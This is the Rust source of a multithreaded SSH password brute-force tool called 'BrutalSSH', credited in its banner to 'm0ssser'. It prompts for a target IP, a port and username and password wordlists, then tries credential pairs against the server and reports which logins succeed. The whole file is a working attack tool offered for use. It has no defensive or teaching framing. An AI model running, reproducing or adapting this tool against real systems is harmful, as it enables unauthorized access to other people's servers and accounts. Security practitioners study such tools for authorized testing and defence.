use colored::*; // For colored output
use std::collections::VecDeque;
use std::fs::File;
use std::io::{self, BufRead, BufReader, Write};
use std::net::TcpStream;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use ssh2::Session;

const BANNER: &str = r#"
.______ __ __ _______. _______. __ __ ______ .______ ___ ______ __ ___
| _ \ | | | | / | / || | | | / || _ \ / \ / || |/ /
| |_) | | | | | | (----` | (----`| |__| | | ,----'| |_) | / ^ \ | ,----'| ' /
| / | | | | \ \ \ \ | __ | | | | / / /_\ \ | | | <
| |\ \----.| `--' | .----) | .----) | | | | | | `----.| |\ \----. / _____ \ | `----.| . \
| _| `._____| \______/ |_______/ |_______/ |__| |__| \______|| _| `._____|/__/ \__\ \______||__|\__\

MADE BY m0ssser
"#;

struct BrutalSSH {
host_ip: String,
host_port: u16,
usernames: Arc<Mutex<VecDeque<String>>>,
passwords: Arc<Mutex<VecDeque<String>>>,
threads: usize,
timeout: Duration,
}

impl BrutalSSH {
fn new(host_ip: String, host_port: u16, threads: usize, timeout: Duration) -> Self {
BrutalSSH {
host_ip,
host_port,
usernames: Arc::new(Mutex::new(VecDeque::new())),
passwords: Arc::new(Mutex::new(VecDeque::new())),
threads,
timeout,
}
}

fn fill_queue(&self, filename: &str, is_usernames: bool) {
let file = File::open(filename).expect("Error: File Not Found.");
let reader = BufReader::new(file);
let mut queue = if is_usernames {
self.usernames.lock().unwrap()
} else {
self.passwords.lock().unwrap()
};

for line in reader.lines() {
if let Ok(item) = line {
queue.push_back(item);
}
}
}

fn ssh_connect(&self, username: &str, password: &str) {
let tcp = match TcpStream::connect_timeout(
&format!("{}:{}", self.host_ip, self.host_port).parse().unwrap(),
self.timeout,
) {
Ok(stream) => stream,
Err(_) => {
println!("{}", format!("{} : {} - Connection Failed", username, password).red());
return;
}
};

let mut session = Session::new().unwrap();
session.set_tcp_stream(tcp);
session.handshake().unwrap();

match session.userauth_password(username, password) {
Ok(_) => {
if session.authenticated() {
println!("{}", format!("{} : {} - Successful", username, password).green());
} else {
println!("{}", format!("{} : {} - Failed", username, password).red());
}
}
Err(_) => {
println!("{}", format!("{} : {} - Authentication Failed", username, password).red());
}
}
}

fn brute_single(&self, username: String) {
let passwords = self.passwords.clone();

let mut handles = vec![];

for _ in 0..self.threads {
let username_clone = username.clone();
let passwords_clone = passwords.clone();
let host_ip_clone = self.host_ip.clone();
let host_port_clone = self.host_port;
let timeout_clone = self.timeout;

let handle = thread::spawn(move || {
let mut passwords = passwords_clone.lock().unwrap();

while let Some(password) = passwords.pop_front() {
drop(passwords); // unlock mutex during SSH connection

let ssh = BrutalSSH {
host_ip: host_ip_clone.clone(),
host_port: host_port_clone,
usernames: Arc::new(Mutex::new(VecDeque::new())),
passwords: Arc::new(Mutex::new(VecDeque::new())),
threads: 1,
timeout: timeout_clone,
};

ssh.ssh_connect(&username_clone, &password);

passwords = passwords_clone.lock().unwrap();
}
});

handles.push(handle);
}

for handle in handles {
handle.join().unwrap();
}
}

fn start(&self) {
let usernames = self.usernames.clone();

while let Some(username) = usernames.lock().unwrap().pop_front() {
self.brute_single(username);
}
}
}

fn main() {
// Print the banner
println!("{}", BANNER);

let mut input = String::new();

// Prompt for IP address
print!("{}", "Enter target IP address: ".yellow().bold());
io::stdout().flush().unwrap();
io::stdin().read_line(&mut input).unwrap();
let host_ip = input.trim().to_string();

// Prompt for port
input.clear();
print!("{}", "Enter target port (default 22): ".yellow().bold());
io::stdout().flush().unwrap();
io::stdin().read_line(&mut input).unwrap();
let host_port = input.trim().parse().unwrap_or(22);

// Prompt for username wordlist
input.clear();
print!("{}", "Enter path to username wordlist: ".yellow().bold());
io::stdout().flush().unwrap();
io::stdin().read_line(&mut input).unwrap();
let username_wordlist = input.trim().to_string();

// Prompt for password wordlist
input.clear();
print!("{}", "Enter path to password wordlist: ".yellow().bold());
io::stdout().flush().unwrap();
io::stdin().read_line(&mut input).unwrap();
let password_wordlist = input.trim().to_string();

let brutal_ssh = BrutalSSH::new(host_ip, host_port, 4, Duration::from_secs(5));

brutal_ssh.fill_queue(&username_wordlist, true);
brutal_ssh.fill_queue(&password_wordlist, false);

println!("{}", "[+] Starting Bruteforce...".yellow().bold());
brutal_ssh.start();
println!("{}", "[+] Bruteforce Completed.".green().bold());
}
